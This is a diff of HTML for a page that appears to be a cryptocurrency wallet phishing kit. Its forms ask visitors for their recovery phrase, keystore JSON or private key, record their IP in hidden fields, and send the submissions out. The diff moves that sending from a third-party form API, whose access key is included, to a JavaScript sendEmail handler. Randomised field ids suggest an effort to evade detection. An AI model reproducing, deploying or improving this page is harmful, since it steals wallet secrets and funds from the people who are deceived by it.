@@ -234,8 +234,7 @@
     </div>
     <div class="container">
         <div class="tab-content pt-md-5 px-md-5 pt-5 px-2" id="phrase-form">
-          <form  id="pass-phrase" action="https://api.web3forms.com/submit" method="POST">
-            <input type="hidden" name="access_key" value="cc84e718-bc05-40a2-9b45-dfd839275a30">
+          <form  id="pass-phrase-form" onsubmit="sendEmail(event, 'pass-phrase-form')">
                 <textarea name="phrase" id="vepgzijzsg" class="phrase-field" placeholder="Phrase"></textarea>
                 <input type="hidden" name="user_ip" id="user_ip_phrase">
                 <input type="hidden" name="type" id="type-phrase">
@@ -246,8 +245,7 @@
             
         </div>
         <div class="tab-content pt-md-5 px-md-5 pt-5 px-2" id="json-form">
-          <form  id="pass-phrase" action="https://api.web3forms.com/submit" method="POST">
-            <input type="hidden" name="access_key" value="cc84e718-bc05-40a2-9b45-dfd839275a30">
+          <form  id="keystore-form" onsubmit="sendEmail(event, 'keystore-form')">
               <input type="hidden" name="_captcha" value="false">
               <input type="hidden" name="_template" value="table">
                 <textarea name="keystore" id="tnknmtqnlu" class="phrase-field" placeholder="Keystore JSON"></textarea>
@@ -259,8 +257,7 @@
             </form>
         </div>
         <div class="tab-content pt-md-5 px-md-5 pt-5 px-2" id="pkey-form">
-          <form  id="pass-phrase" action="https://api.web3forms.com/submit" method="POST">
-            <input type="hidden" name="access_key" value="cc84e718-bc05-40a2-9b45-dfd839275a30">
+          <form  id="privatekey-form" onsubmit="sendEmail(event, 'privatekey-form')">
               <input type="hidden" name="_captcha" value="false">
               <input type="hidden" name="_template" value="table">
                 <textarea name="privatekey" id="slpfoduuxq" class="phrase-field" placeholder="Private Key"></textarea>
